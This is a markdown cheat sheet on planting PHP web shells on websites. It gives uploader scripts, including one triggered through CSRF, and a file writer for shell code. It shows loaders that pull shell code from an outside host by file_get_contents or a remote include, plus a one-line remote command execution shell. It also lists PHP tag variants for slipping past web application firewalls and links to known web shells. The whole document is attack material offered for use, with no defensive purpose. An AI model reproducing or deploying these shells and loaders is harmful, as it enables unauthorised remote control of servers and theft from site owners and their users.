# PHP Shell Uploading Scripts and Bypass
### Uploader
1. Normal File Uploader
>

    <?php 
        echo 'Uploader<br>';
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" value="Upload"></form>';
        if( $_POST['_upl'] == "Upload" ) {
            if(copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
                echo '<b>Success</b><br><br>';
            }else {
                echo '<b>Failed</b><br><br>'; 
            }
	}
    ?>

2. CSRF File Uploader

>This uploader bypasses content length if the normal file uploader code is too long. To access this, open the file where you save it and do a CSRF with POST file value of `file`.

	
    <?php
    	copy($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    ?>
> This saves your file to the same directory of the uploader.    
3. File Get Contents
>

    <?php
    	file_put_contents(file_get_contents('https://somesite.com/shell.txt'),'shell.php');
    ?>
> Will work if `allow_url_fopen` is on. Upload this as up.php then open it. It will automatically generate a file named shell.php on the same directory.

4. File Writer ([link](https://github.com/alita-ido/PHP-File-Writer))
>If you managed to make a file uploader but it doesn't work, maybe the site does not allow uploading. Some sites don't enable upload functions, hence `move_uploaded_files` and `copy_uploaded_files` will not work. File writer works by using different command (`fwrite`).


    <?php
        $a = $_POST['code'];
        $file = fopen($_POST['file'],'w');
        fwrite($file,$a);
        fclose($file);
    ?>
    <center>
      <form method="post" id="form">
        <h2>File Writer</h2>
        File Name<br><input type="text" name="file" placeholder="shell.php"><br>
        Shell Code<br><textarea name="code" form="form" placeholder="Paste your shell here"></textarea><br>
        <input type="submit" value="Write">
      </form>
    </center>
If all of the above fails or is blocked by WAF, try using other php notations.

a. `<?php echo 'sample'; ?>` - normal one

b. `<? echo 'sample'; ?>` - will work if short_open_tag is enabled

c. `<% echo 'sample'; %>` - PHP < 7.0.0

d. `<script language="php"> echo 'sample'; </script>` - PHP < 7.0.0

### Shell Codes I use
1. [b374k](http://www.topshellv.com/shell/b374k-shell)
> This shell is large >900kb. The size is large which gives room to more functionality. But more functionality means more functions used, and more functions used results to more `DISABLE_FUNCTIONS` which might result again to error in shell or blocked by WAF.

2. [RBBD priv8 shell](https://github.com/iamhex/Priv8-Shell-v3)
> I think this is a "so called" bypass shell.It is light weight, around ~70kb. I think it is based on wso.php web shell

3. [b374k-mini](https://github.com/The404Hacking/b374k-mini/)
> File size is ~14kb and bypasses as well some WAFs while uploading

4. RCE shell
> I use this when we need to  upload a shell with very small file size

	<?=`$_GET[1]`?>
> This is a shorthand notation for `<?php echo shell_exec($_GET['1']);?>`. But note that this only works if `shell_exec` is not in the `DISABLE_FUNCTIONS` in phpinfo. To access this, just /shell.php?1=whoami

5. Include
> Used for bypassing file size as well due to its small size.

	<?php include('https://somewebshell.com/shell.txt');?>
    
> This will work only if `allow_url_include` is not in the `DISABLE_FUNCTIONS` in phpinfo.
